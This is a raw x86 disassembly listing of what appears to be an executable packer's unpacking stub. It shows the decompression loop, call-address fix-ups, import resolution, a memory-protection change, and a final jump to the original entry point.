  4c7f26:	add    ebx,ebx
  4c7f28:	jne    0x4c7f31
  4c7f2a:	mov    ebx,DWORD PTR [esi]
  4c7f2c:	sub    esi,0xfffffffc
  4c7f2f:	adc    ebx,ebx
  4c7f31:	adc    ecx,ecx
  4c7f33:	add    ebx,ebx
  4c7f35:	jae    0x4c7f26
  4c7f37:	jne    0x4c7f42
  4c7f39:	mov    ebx,DWORD PTR [esi]
  4c7f3b:	sub    esi,0xfffffffc
  4c7f3e:	adc    ebx,ebx
  4c7f40:	jae    0x4c7f26
  4c7f42:	add    ecx,0x2
  4c7f45:	cmp    ebp,0xfffffb00
  4c7f4b:	adc    ecx,0x2
  4c7f4e:	lea    edx,[edi+ebp*1]
  4c7f51:	cmp    ebp,0xfffffffc
  4c7f54:	jbe    0x4c7f64
  4c7f56:	mov    al,BYTE PTR [edx]
  4c7f58:	inc    edx
  4c7f59:	mov    BYTE PTR [edi],al
  4c7f5b:	inc    edi
  4c7f5c:	dec    ecx
  4c7f5d:	jne    0x4c7f56
  4c7f5f:	jmp    0x4c7ea6
  4c7f64:	mov    eax,DWORD PTR [edx]
  4c7f66:	add    edx,0x4
  4c7f69:	mov    DWORD PTR [edi],eax
  4c7f6b:	add    edi,0x4
  4c7f6e:	sub    ecx,0x4
  4c7f71:	ja     0x4c7f64
  4c7f73:	add    edi,ecx
  4c7f75:	jmp    0x4c7ea6
  4c7f7a:	pop    esi
  4c7f7b:	mov    edi,esi
  4c7f7d:	mov    ecx,0x379b
  4c7f82:	mov    al,BYTE PTR [edi]
  4c7f84:	inc    edi
  4c7f85:	sub    al,0xe8
  4c7f87:	cmp    al,0x1
  4c7f89:	ja     0x4c7f82
  4c7f8b:	cmp    BYTE PTR [edi],0x13
  4c7f8e:	jne    0x4c7f82
  4c7f90:	mov    eax,DWORD PTR [edi]
  4c7f92:	mov    bl,BYTE PTR [edi+0x4]
  4c7f95:	shr    ax,0x8
  4c7f99:	rol    eax,0x10
  4c7f9c:	xchg   ah,al
  4c7f9e:	sub    eax,edi
  4c7fa0:	sub    bl,0xe8
  4c7fa3:	add    eax,esi
  4c7fa5:	mov    DWORD PTR [edi],eax
  4c7fa7:	add    edi,0x5
  4c7faa:	mov    al,bl
  4c7fac:	loop   0x4c7f87
  4c7fae:	lea    edi,[esi+0xc3000]
  4c7fb4:	mov    eax,DWORD PTR [edi]
  4c7fb6:	or     eax,eax
  4c7fb8:	je     0x4c7fff
  4c7fba:	mov    ebx,DWORD PTR [edi+0x4]
  4c7fbd:	lea    eax,[eax+esi*1+0xdeaa8]
  4c7fc4:	add    ebx,esi
  4c7fc6:	push   eax
  4c7fc7:	add    edi,0x8
  4c7fca:	call   DWORD PTR [esi+0xdebfc]
  4c7fd0:	xchg   ebp,eax
  4c7fd1:	mov    al,BYTE PTR [edi]
  4c7fd3:	inc    edi
  4c7fd4:	or     al,al
  4c7fd6:	je     0x4c7fb4
  4c7fd8:	mov    ecx,edi
  4c7fda:	jns    0x4c7fe3
  4c7fdc:	movzx  eax,WORD PTR [edi]
  4c7fdf:	inc    edi
  4c7fe0:	push   eax
  4c7fe1:	inc    edi
  4c7fe2:	mov    ecx,0xaef24857
  4c7fe7:	push   ebp
  4c7fe8:	call   DWORD PTR [esi+0xdec00]
  4c7fee:	or     eax,eax
  4c7ff0:	je     0x4c7ff9
  4c7ff2:	mov    DWORD PTR [ebx],eax
  4c7ff4:	add    ebx,0x4
  4c7ff7:	jmp    0x4c7fd1
  4c7ff9:	call   DWORD PTR [esi+0xdec10]
  4c7fff:	mov    ebp,DWORD PTR [esi+0xdec04]
  4c8005:	lea    edi,[esi-0x1000]
  4c800b:	mov    ebx,0x1000
  4c8010:	push   eax
  4c8011:	push   esp
  4c8012:	push   0x4
  4c8014:	push   ebx
  4c8015:	push   edi
  4c8016:	call   ebp
  4c8018:	lea    eax,[edi+0x217]
  4c801e:	and    BYTE PTR [eax],0x7f
  4c8021:	and    BYTE PTR [eax+0x28],0x7f
  4c8025:	pop    eax
  4c8026:	push   eax
  4c8027:	push   esp
  4c8028:	push   eax
  4c8029:	push   ebx
  4c802a:	push   edi
  4c802b:	call   ebp
  4c802d:	pop    eax
  4c802e:	popa   
  4c802f:	lea    eax,[esp-0x80]
  4c8033:	push   0x0
  4c8035:	cmp    esp,eax
  4c8037:	jne    0x4c8033
  4c8039:	sub    esp,0xffffff80
  4c803c:	jmp    0x4165c1
	...
